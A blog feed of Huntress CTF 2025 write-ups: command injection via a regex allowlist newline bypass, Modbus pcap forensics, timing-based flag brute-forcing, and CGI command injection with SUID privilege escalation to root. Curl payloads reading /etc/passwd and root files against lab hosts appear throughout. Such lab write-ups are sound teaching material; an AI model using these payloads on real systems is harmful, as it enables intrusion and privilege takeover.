<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-02T18:21:47+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Writeups</title><subtitle>Website where I will publish my writeups</subtitle><author><name>alphaz3r0</name><email></email></author><entry><title type="html">Huntress CTF 2025 - Arika</title><link href="http://localhost:4000/writeup/web/Arika" rel="alternate" type="text/html" title="Huntress CTF 2025 - Arika" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/web/Arika</id><content type="html" xml:base="http://localhost:4000/writeup/web/Arika"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<p>The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website… but it sounds like they are worried about some security concerns of their own!</p>

<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>

<p>When first approaching the Arika website, I encountered a terminal-style interface with a limited set of allowed commands: <code class="language-plaintext highlighter-rouge">leaks</code>, <code class="language-plaintext highlighter-rouge">news</code>, <code class="language-plaintext highlighter-rouge">contact</code>, <code class="language-plaintext highlighter-rouge">help</code>, <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">date</code>, <code class="language-plaintext highlighter-rouge">hostname</code>, and <code class="language-plaintext highlighter-rouge">clear</code>.</p>

<p>I started by testing the basic functionality:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help"}'</span> | jq <span class="nb">.</span>
</code></pre></div></div>

<p>The response confirmed the application was working and showed the allowlist. My initial thought was to try classic command injection techniques:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attempt 1: Semicolon injection</span>
curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help; ls"}'</span> | jq <span class="nb">.</span>

<span class="c"># Attempt 2: Pipe injection  </span>
curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"leaks &amp;&amp; cat /etc/passwd"}'</span> | jq <span class="nb">.</span>
</code></pre></div></div>

<p><strong>Result</strong>: All attempts failed with “Run ‘help’ to see valid commands” error. The allowlist seemed robust at first glance.</p>

<p>Examining the provided <code class="language-plaintext highlighter-rouge">app.py</code> revealed the vulnerability:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">([</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s">"^%s$"</span> <span class="o">%</span> <span class="n">allowed</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ALLOWLIST</span><span class="p">))</span> <span class="k">for</span> <span class="n">allowed</span> <span class="ow">in</span> <span class="n">ALLOWLIST</span><span class="p">]):</span>
</code></pre></div></div>

<p>The critical insight was recognizing that <code class="language-plaintext highlighter-rouge">len(ALLOWLIST)</code> equals 8, which corresponds to <code class="language-plaintext highlighter-rouge">re.MULTILINE</code> flag in Python’s regex module. This changed everything!</p>

<h3 id="understanding-the-multiline-flag-impact">Understanding the MULTILINE Flag Impact</h3>

<p>With <code class="language-plaintext highlighter-rouge">re.MULTILINE</code>:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">^</code> matches start of <strong>any line</strong> (not just start of string)</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">$</code> matches end of <strong>any line</strong> (not just end of string)</p>
  </li>
</ul>

<p>This meant the pattern <code class="language-plaintext highlighter-rouge">^help$</code> would match if “help” appeared as a complete line anywhere in the input, not just as the entire input.</p>

<h3 id="proof-of-concept">Proof of Concept</h3>

<p>I tested the newline injection theory:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"leaks\nls"}'</span> | jq <span class="nb">.</span>
</code></pre></div></div>

<p><strong>Success!</strong> The response showed both the leaks output AND a directory listing, confirming command injection was possible.</p>

<p>And we see the flag also so just by running:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help\ncat flag.txt"}'</span> | jq <span class="nb">.</span>
</code></pre></div></div>

<p>We get the flag</p>

<p>Response:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "code": 0,
  "ok": true,
  "stderr": "",
  "stdout": "List of all commands:\n leaks      — hacked companies\n news       — news about upcoming data releases\n contact    — send us a message and we will contact you\n help       — available commands\n clear      — clear screen\nflag{eaec346846596f7976da7e1adb1f326d}\n"
}
</code></pre></div></div>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="web" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Bussing Around</title><link href="http://localhost:4000/writeup/forensics/Bussing-Around" rel="alternate" type="text/html" title="Huntress CTF 2025 - Bussing Around" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/Bussing-Around</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/Bussing-Around"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>One of the engineers noticed that an HMI was going haywire.</p>

  <p>He took a packet capture of some of the traffic but he can’t make any sense of it… it just looks like gibberish!</p>

  <p>For some reason, some of the traffic seems to be coming from someone’s computer. Can you help us figure out what’s going on?</p>
</blockquote>

<p>Provided files: <code class="language-plaintext highlighter-rouge">bussing_around.pcapng</code></p>

<hr />

<p>When we open a file <code class="language-plaintext highlighter-rouge">bussing_around.pcapng</code> with the tool wireshark we see that there are a lot of <code class="language-plaintext highlighter-rouge">modbus</code> packages recorded. Because this challenge will be done easier with tshark we should get familiar with it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark -r capture.pcapng -z io,phs

===================================================================  
Protocol Hierarchy Statistics  
Filter:    
  
frame                                    frames:16909 bytes:1251252  
 eth                                    frames:16909 bytes:1251252  
   ipv6                                 frames:1 bytes:142  
     icmpv6                             frames:1 bytes:142  
   arp                                  frames:2 bytes:102  
   ip                                   frames:16906 bytes:1251008  
     tcp                                frames:16906 bytes:1251008  
       mbtcp                            frames:11266 bytes:878748  
         modbus                         frames:11266 bytes:878748  
===================================================================
</code></pre></div></div>

<p>This shows a hierarchical breakdown of all protocols in the capture file with percentages.</p>

<p>After some googling to understand how Modbus works:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Modbus is an industrial communication protocol that enables data exchange between electronic devices, most commonly in building and manufacturing automation. It works on a request-response model where a client device sends a request to one or more server devices, which then respond with the requested data or a status acknowledgment
</code></pre></div></div>

<p>After looking at the provided file we can notice that there are only 3 registers used: 0,4 and 10.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eurus@archlinux:~/Documents/day18$ tshark -r capture.pcapng -Y "modbus" -T fields -e modbus.regnum16 | sort | uniq -c |  
sort -nr  
  4528 0  
  2274 10  
  2240 4  
  2224
</code></pre></div></div>

<p>After analyzing all three registers:</p>
<ul>
  <li>Register 4: Had diverse values but no obvious pattern</li>
  <li>Register 10: Values were in ASCII range but didn’t form coherent text</li>
  <li>Register 0: Only two values with high frequency</li>
</ul>

<p>The binary nature of Register 0 stood out as the most likely candidate for hidden data, since binary is the fundamental language of computers and perfect for encoding files.</p>

<p>I concatenated the sequential 0 and 1 values into a continuous binary string, then grouped them into 8-bit chunks (bytes). Each byte was converted from binary to its decimal value, creating a byte array that was written directly to disk as a file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark -r capture.pcapng -Y "modbus.regnum16 == 0 and tcp.dstport==502" -T fields -e  
modbus.regval_uint16 | tr -d '\n' &gt; binary.txt
</code></pre></div></div>

<p>added the destination port to not get duplicates with same value in both request and response.</p>

<p>Then I wrote a simple script that will get the 0s and 1s and save them to a file:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s2">"b=open('binary.txt').read().replace(' ','').replace('</span><span class="se">\n</span><span class="s2">',''); open('flag','wb').write(int(b,2).to_bytes(len(b)//8,'big'))"</span>
</code></pre></div></div>

<p>Running a [[file]] command we see this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file flag  
flag: Zip archive data, at least v1.0 to extract, compression method=store
</code></pre></div></div>

<p>When we try to extract it we also see this comment:
<code class="language-plaintext highlighter-rouge">Comment = The password is 5939f3ec9d820f23df20948af09a5682 .</code></p>

<p>And <code class="language-plaintext highlighter-rouge">flag.txt</code> gets extracted - <code class="language-plaintext highlighter-rouge">flag{4d2a66c5ed8bb8cd4e4e1ab32c71f7a3}</code> :)</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Flag Checker</title><link href="http://localhost:4000/writeup/web/Flag-Checker" rel="alternate" type="text/html" title="Huntress CTF 2025 - Flag Checker" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/web/Flag-Checker</id><content type="html" xml:base="http://localhost:4000/writeup/web/Flag-Checker"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>We’ve decided to make this challenge really straight forward. All you have to do is find out the flag!</p>

  <p>Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks…</p>
</blockquote>

<hr />
<h2 id="thought-process">Thought process</h2>

<p>After sending request and looking and responses and also knowing the flag format:</p>

<p>I tested multiple scenarios and noticed one thing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>f
HTTP/1.1 200 OK
Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 10 Oct 2025 14:53:10 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.101613

curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>a
HTTP/1.1 200 OK
Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 10 Oct 2025 14:53:13 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001067

curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>b
HTTP/1.1 200 OK
Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 10 Oct 2025 14:54:06 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001057

</code></pre></div></div>

<p>Notice anything that stands out. Lets try with this one, remember we know flag format is <code class="language-plaintext highlighter-rouge">flag\{[0-9a-f]{32}\}</code>
So basically 32 characters of hex numbers between the {}</p>

<p>Now look at these two requests:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span>flag
HTTP/1.1 200 OK
Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 10 Oct 2025 14:56:39 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.401796

curl <span class="nt">-s</span> <span class="nt">-D</span> - <span class="nt">-o</span> /dev/null http://10.1.221.57/submit?flag<span class="o">=</span><span class="nb">test
</span>HTTP/1.1 200 OK
Server: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 10 Oct 2025 14:56:46 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.000985
</code></pre></div></div>

<p>We can see that when a character is correct, the <code class="language-plaintext highlighter-rouge">X-Response-Time</code> has noticeably longer response time then the others(~0.1s). With this knowledge we can “bruteforce” the flag. So I wrote really bad script that tested all 0-9a-f and then when it found the character that has <code class="language-plaintext highlighter-rouge">X-Response-Time</code> greater then the others saves it and continues with the next character.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="web" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Phasing Through Printers</title><link href="http://localhost:4000/writeup/misc/Phasing-Through-Printers" rel="alternate" type="text/html" title="Huntress CTF 2025 - Phasing Through Printers" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/Phasing-Through-Printers</id><content type="html" xml:base="http://localhost:4000/writeup/misc/Phasing-Through-Printers"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>I found this printer on the network, and it seems to be running… a weird web page… to search for drivers?</p>

  <p>Here is some of the code I could dig up.</p>
</blockquote>

<p>NOTE</p>

<blockquote>
  <p>Escalate your privileges and uncover the flag in the <strong><code class="language-plaintext highlighter-rouge">root</code></strong> user’s home directory.</p>
</blockquote>

<hr />

<h2 id="thought-process">Thought process:</h2>

<p>We are provided with folder that has this structure:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├── cgi-bin
│   └── search.c
└── www
    └── index.html
</code></pre></div></div>

<p>And also give the ip of web application that is running.</p>

<p>Lets see what we have in index.html and search.c:</p>

<h3 id="searchc">search.c:</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">urldecode2</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
                    <span class="p">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">b</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&amp;&amp;</span>
                    <span class="p">(</span><span class="n">isxdigit</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">isxdigit</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">a</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'a'</span><span class="p">)</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'a'</span><span class="o">-</span><span class="sc">'A'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;=</span> <span class="sc">'A'</span><span class="p">)</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="p">(</span><span class="sc">'A'</span> <span class="o">-</span> <span class="mi">10</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">b</span> <span class="o">-=</span> <span class="sc">'0'</span><span class="p">;</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="mi">16</span><span class="o">*</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">;</span>
                        <span class="n">src</span><span class="o">+=</span><span class="mi">3</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">'+'</span><span class="p">)</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
                        <span class="n">src</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
<span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">env_value</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">save_env</span><span class="p">;</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">"Content-type: text/html</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">save_env</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"QUERY_STRING"</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="s">"q="</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memmove</span><span class="p">(</span><span class="n">save_env</span><span class="p">,</span> <span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span>

   <span class="kt">char</span> <span class="o">*</span><span class="n">decoded</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">save_env</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

   <span class="n">urldecode2</span><span class="p">(</span><span class="n">decoded</span><span class="p">,</span> <span class="n">save_env</span><span class="p">);</span>


   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
   <span class="kt">size_t</span> <span class="n">totalLength</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">first_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">last_part</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">combinedString</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totalLength</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">combinedString</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to allocate memory"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="n">strcpy</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">first_part</span><span class="p">);</span>
   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">decoded</span><span class="p">);</span>
   <span class="n">strcat</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="n">last_part</span><span class="p">);</span>
   <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

   <span class="n">fp</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">combinedString</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error running command</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"%s&lt;br&gt;"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">pclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   <span class="n">free</span><span class="p">(</span><span class="n">combinedString</span><span class="p">);</span>
   <span class="n">free</span><span class="p">(</span><span class="n">decoded</span><span class="p">);</span>
   <span class="n">exit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="indexhtml">index.html:</h3>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;h1&gt;</span>Printer Driver Search<span class="nt">&lt;/h1&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/cgi-bin/search.cgi"</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">placeholder=</span><span class="s">"Enter printer model or driver name"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>So it takes our input and creates request with adding these two lines:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kt">char</span> <span class="n">first_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"grep -R -i "</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">last_part</span><span class="p">[]</span> <span class="o">=</span> <span class="s">" /var/www/html/data/printer_drivers.txt"</span> <span class="p">;</span>
</code></pre></div></div>

<p>So if we searched for example for string “test” request would be:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-R</span> <span class="nt">-i</span> <span class="nb">test</span> /var/www/html/data/printer_drivers.txt
</code></pre></div></div>

<p>Now it is obvious it will be command injection because we are able to create request that will execute on a server, but we need to modify it a little:</p>

<p>if we can make first and last part sepperate commands we can send a command:</p>

<p>if we are able to send a request that looks like this we can execute commands on an server:</p>

<p><code class="language-plaintext highlighter-rouge">;whoami;</code></p>

<p>lets URL encode the <code class="language-plaintext highlighter-rouge">;</code> and send request with curl:</p>

<p>after sending request like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bwhoami%3B%3B
</code></pre></div></div>

<p>We receive response that confirms our hypotesis:</p>

<p><code class="language-plaintext highlighter-rouge">www-data</code></p>

<p>With this we would be able to gain reverse shell but I found it faster and easier to interact with the server just by commands, and after some commands to see if we can escalate our privilages. After some digging I looked at the files with the <strong>SUID bit set</strong> (the setuid permission):</p>

<p><code class="language-plaintext highlighter-rouge">find / -perm -4000 -type f 2&gt;&amp;1</code></p>

<p><code class="language-plaintext highlighter-rouge">curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bfind%20/%20-perm%20-4000%20-type%20f%202%3E%261%3B"</code></p>

<p>And we see one interesting application that has SUID bit set:</p>

<p><code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>

<p>My first thought was to somehow get it on my machine and preform some reverse engineering but first I ran strings to see if there is anything interesting:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bstrings%20/usr/local/bin/admin_help%3B"
</code></pre></div></div>

<p>And I saw this part:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;Your wish is my command... maybe :)
&lt;br&gt;chmod +x /tmp/wish.sh &amp;&amp; /tmp/wish.sh
</code></pre></div></div>

<p>So it gives temp file called wish.sh executable bit and executes it. Can we create that file and write to it what we want, lets see if we have privileges to create files in <code class="language-plaintext highlighter-rouge">/tmp</code> folder:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Bls%20-ld%20%2Ftmp%3B"
drwxrwxrwt 1 root root 4096 Oct 15 13:13 /tmp
</code></pre></div></div>

<p>that part at the end: <code class="language-plaintext highlighter-rouge">rwt</code> means others can read, write, execute + <strong>sticky bit</strong></p>

<p>Lets echo a command to that file and then run <code class="language-plaintext highlighter-rouge">/usr/local/bin/admin_help</code></p>

<h2 id="exploit">Exploit:</h2>

<p><code class="language-plaintext highlighter-rouge">;echo "whoami" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>

<p>URL encoding it and sending a request with curl we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22whoami%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

root
</code></pre></div></div>

<p>And just like that we pwned the system now only thing left is to cat the flag as root.</p>

<h2 id="final-exploit">Final exploit</h2>

<p><code class="language-plaintext highlighter-rouge">;echo "cat /root/flag.txt" &gt;  /tmp/wish.sh &amp; /usr/local/bin/admin_help;</code></p>

<p>URL encoding it and sending a request with curl we get the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://10.1.58.247/cgi-bin/search.cgi?q=%3Becho%20%22cat%20%2Froot%2Fflag%2Etxt%22%20%3E%20%20%2Ftmp%2Fwish%2Esh%20%26%20%2Fusr%2Flocal%2Fbin%2Fadmin%5Fhelp%3B"

flag{93541544b91b7d2b9d61e90becbca309}
